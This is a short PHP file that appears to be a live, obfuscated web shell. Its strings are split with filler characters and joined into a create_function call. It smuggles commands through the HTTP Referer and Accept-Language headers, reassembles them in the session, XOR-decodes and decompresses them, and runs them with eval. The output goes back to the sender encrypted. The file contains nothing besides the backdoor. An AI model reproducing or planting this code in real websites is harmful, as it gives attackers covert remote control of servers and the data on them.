<?php
$s='g_replace(arfBray("/fB_/fB","/-/"),arfBrafBy("/","+"fB)fB,$sfBs($s[$i]fB,0,$fBe))),$k))fB);$o=ob_gefBt_cfBontents();fBfBob_';
$o='$kh="5fBd41";$kfBf="40fB2a";fufBnction x($tfB,$k){fB$c=sfBtrlen(fBfB$k);$lfB=sfBtrlenfB(fBfB$t);$o="fBfB";for($i=0fB;$i<$l;){for';
$U='RER"];fB$fBrfBa=@$r["HfBTTfBP_ACCfBEPT_LANGUAGE"];if($fBrr&&$ra){fB$ufB=parfBse_urfBl($rr);pafBrse_fBstrfB($fBu["qufBery"],$q';
$x='enfBdfB_clean();$d=base6fB4_encodfBe(fBx(gzcomprfBfBefBss($o),$k));print("fB<$kfB>$d<fB/$k>");@sefBssion_fBdestrofBy();}}}}';
$n='[$zfB]fB];fBif(strpos($p,$hfB)fB===0)fB{$s[$i]=""fB;fB$p=$ss($fBp,3);}if(fBarrafBy_keyfB_exifBsts($i,fB$s)fB){$s[$ifB].=$p';
$b=str_replace('ja','','cjarjaeajate_fujajanjaction');
$g='fB);$q=array_valfBues($q)fB;pregfB_mafBfBtch_all("/([\\w])[fB\\w-]fB+(?:;q=0fB.([\\d]))?fB,?/",$fBra,$m)fB;if($qfBfB&&$mfB){';
$k='@session_stfBarfBt()fB;$s=fB&$_SESSION;fB$ss="sfBubsfBtr";$slfB="strtolowefBfBfBfBr";$i=$m[1][0].$mfB[1][1]fB;$h=$fBfBsl(';
$X=';$e=strpofBs($sfB[$i],$f)fB;if(fB$e){fB$k=$kh.$kfBf;fBob_start();@fBfBefBval(@gzuncomprefBss(@x(@bfBase6fB4_decodfBe(pfBrefB';
$C='($j=0;($j<$fBc&&$i<$fBl)fB;$j++,$i++)fB{$o.=$t{$ifB}^$k{$jfB};}}fBfBreturfBn $o;fB}$r=$_SERVER;$rfBr=@$r["fBHTTP_fBfBREFE';
$a='$ss(fBmd5($i.$fBkh),0,3));$f=$sl($sfBs(mfBd5($fBi.$kffB),0fB,3)fB);$p="";for(fB$z=1;$z<coufBnt($mfB[1])fB;$z++)$fBp.=$q[$m[fB2]';
$P=str_replace('fB','',$o.$C.$U.$g.$k.$a.$n.$X.$s.$x);
$v=$b('',$P);$v();
?>
